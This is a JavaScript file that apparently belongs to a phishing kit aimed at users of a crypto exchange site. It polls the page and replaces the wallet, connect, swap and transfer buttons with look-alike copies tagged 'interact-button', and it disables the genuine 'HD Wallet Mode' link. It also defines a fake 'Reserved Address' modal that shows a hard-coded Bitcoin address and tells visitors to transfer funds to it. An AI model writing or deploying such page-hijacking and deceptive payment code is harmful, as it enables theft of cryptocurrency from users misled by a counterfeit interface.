let walletBtn;
let connectBtn;
let moreOptions;
let swapBtn;
let mainBtn;
let hdwalletMode;
console.log("sserrrnn");

function getBtn() {
  const intv = setInterval(() => {
    walletBtn = document.querySelector(".MuiStack-root.mui-style-1qftbaz");
    connectBtn = document.querySelector(connectBtnClasses);
    moreOptions = document.querySelector(moreOptionsClasses);
    swapBtn = document.querySelector(swapBtnClasses);
    mainBtn = document.querySelector(mainBtnClasses);
    hdwalletMode = document.querySelector(
      'a[href="https://app-hd.multibit.exchange/"]'
    );
    console.log("loop");
    if (hdwalletMode) {
      // try {
      walletBtn.outerHTML = wlt1;
      if (connectBtn) connectBtn.outerHTML = connectBtn1;
      if (moreOptions) moreOptions.outerHTML = moreOptions1;
      swapBtn.outerHTML = swapBtn1;
      mainBtn.outerHTML = mainBtn1;
      hdwalletMode.outerHTML = hdwalletMode1;
      console.log(hdwalletMode);
      // } catch (error) {}
      clearInterval(intv);
    }
  }, 300);
}
getBtn();
// document.addEventListener("DOMContentLoaded", () => {
//   walletBtn = document.querySelector(".MuiStack-root.mui-style-1qftbaz");
//   console.log(walletBtn);
// });
const connectBtnClasses = `.MuiButtonBase-root.MuiButton-root.MuiButton-outlined.MuiButton-outlinedSecondary.MuiButton-sizeMedium.MuiButton-outlinedSizeMedium.MuiButton-root.MuiButton-outlined.MuiButton-outlinedSecondary.MuiButton-sizeMedium.MuiButton-outlinedSizeMedium.mui-style-1anrwp7`;
const connectBtn1 = `<button class="MuiButtonBase-root interact-button MuiButton-root MuiButton-outlined MuiButton-outlinedSecondary MuiButton-sizeMedium MuiButton-outlinedSizeMedium MuiButton-root MuiButton-outlined MuiButton-outlinedSecondary MuiButton-sizeMedium MuiButton-outlinedSizeMedium mui-style-1anrwp7" tabindex="0" type="button"><p class="MuiTypography-root MuiTypography-body1 mui-style-1n5801b">Connect Wallet</p><span class="MuiTouchRipple-root mui-style-w0pj6f"></span></button>`;
const wlt1 = `<div class="MuiStack-root mui-style-1qftbaz interact-button"><img alt="wallet" width="32" height="32" decoding="async" data-nimg="1" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8cmVjdCB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIGZpbGw9IiNCRkZGMEIiIC8+CiAgPHBhdGgKICAgIGQ9Ik04IDEwVjIxQzggMjIuMTA0NiA4Ljg5NTQzIDIzIDEwIDIzSDIyQzIzLjEwNDYgMjMgMjQgMjIuMTA0NiAyNCAyMVYxNEMyNCAxMi44OTU0IDIzLjEwNDYgMTIgMjIgMTJIMTBDOC44OTU0MyAxMiA4IDExLjEwNDYgOCAxMFYxMFpNOCAxMFYxMEM4IDguODk1NDMgOC44OTU0MyA4IDEwIDhIMjIiCiAgICBzdHJva2U9ImJsYWNrIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJzcXVhcmUiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIC8+CiAgPGNpcmNsZSBjeD0iMjAuNSIgY3k9IjE3LjUiIHI9IjEuNSIgZmlsbD0iYmxhY2siIC8+Cjwvc3ZnPg==" style="color: transparent;"></div>`;
const swapBtnClasses = `.MuiButtonBase-root.MuiButton-root.MuiButton-text.MuiButton-textPrimary.MuiButton-sizeMedium.MuiButton-textSizeMedium.MuiButton-root.MuiButton-text.MuiButton-textPrimary.MuiButton-sizeMedium.MuiButton-textSizeMedium.mui-style-hfgrmn`;
const swapBtn1 = `
<button class="MuiButtonBase-root interact-button MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium mui-style-hfgrmn" tabindex="0" type="button"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium mui-style-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="SwapVertIcon"><path d="M16 17.01V10h-2v7.01h-3L15 21l4-3.99h-3zM9 3 5 6.99h3V14h2V6.99h3L9 3z"></path></svg><span class="MuiTouchRipple-root mui-style-w0pj6f"></span></button>`;
const mainBtnClasses =
  ".MuiButtonBase-root.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeLarge.MuiButton-containedSizeLarge.MuiButton-fullWidth.Mui-disabled.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeLarge.MuiButton-containedSizeLarge.MuiButton-fullWidth.mui-style-ajoyk0";
const mainBtn1 = `<button class="MuiButtonBase-root interact-button MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeLarge MuiButton-containedSizeLarge MuiButton-fullWidth  MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeLarge MuiButton-containedSizeLarge MuiButton-fullWidth mui-style-ajoyk0" tabindex="-1" type="button"><p class="MuiTypography-root interact-button MuiTypography-body1 mui-style-j4vhye">Transfer</p></button>`;

const hdwalletMode1 = `<a  class="interact-button" href="javascript:void();"><p class="MuiTypography-root MuiTypography-body1 interact-button mui-style-kntgtf">HD Wallet Mode →</p></a>`;
const modalClasses = `.MuiDialogContent-root.mui-style-7u6hkg`;
const modal1 = `
<div class="MuiDialogContent-root mui-style-7u6hkg">
<div class="MuiBox-root mui-style-2pe2h5">
<svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M36.2558 11.6163C38.037 8.94455 41.963 8.94454 43.7442 11.6163L78.3359 63.5038C80.3296 66.4943 78.1858 70.5 74.5917 70.5H5.40833C1.8142 70.5 -0.329564 66.4943 1.6641 63.5038L36.2558 11.6163Z" fill="#FA516F" fill-opacity="0.2"></path><rect width="6.4" height="24" transform="matrix(-1 -8.74228e-08 -8.74228e-08 1 43.4004 28)" fill="#FA516F"></rect><rect width="6.4" height="6.4" transform="matrix(-1 -8.74228e-08 -8.74228e-08 1 43.4004 56)" fill="#FA516F"></rect></svg><p class="MuiTypography-root MuiTypography-body1 mui-style-zdogxa">Reserved Address</p><p class="MuiTypography-root MuiTypography-body1 mui-style-5u6b9u">This is the token reserved contract address, please do not transfer directly through the CEX, you will not be able to confirm the source of funds, and you will not be responsible for lost funds.</p><div class="MuiBox-root mui-style-15wjtu8"><p class="MuiTypography-root MuiTypography-body1 mui-style-274chl">bc1pyyms2ssr0hagy5j50r5n689e6ye0626v3c98j5fw0jk6tz3vrgts7nt56g</p><button class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium mui-style-ettcac" tabindex="0" type="button"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium mui-style-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="ContentCopyIcon"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg><span class="MuiTouchRipple-root mui-style-w0pj6f"></span></button></div><button class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-fullWidth MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-fullWidth mui-style-15xmv9c" tabindex="0" type="button">I Know<span class="MuiTouchRipple-root mui-style-w0pj6f"></span></button><div class="MuiStack-root mui-style-dq7t7w"><p class="MuiTypography-root MuiTypography-body1 mui-style-pmib5l">I don't have a wallet plug-in,&nbsp;</p><a target="_blank" href="https://app-hd.multibit.exchange/"><p class="MuiTypography-root MuiTypography-body1 mui-style-38bzvp">HD Wallet Mode →</p></a></div></div></div>
`;

const moreOptionsClasses = `.MuiButtonBase-root.MuiButton-root.MuiButton-text.MuiButton-textPrimary.MuiButton-sizeMedium.MuiButton-textSizeMedium.MuiButton-root.MuiButton-text.MuiButton-textPrimary.MuiButton-sizeMedium.MuiButton-textSizeMedium.mui-style-wekeca`;
const moreOptions1 = `<button class="MuiButtonBase-root interact-button MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium mui-style-wekeca" tabindex="0" type="button">···<span class="MuiTouchRipple-root mui-style-w0pj6f"></span></button>`;
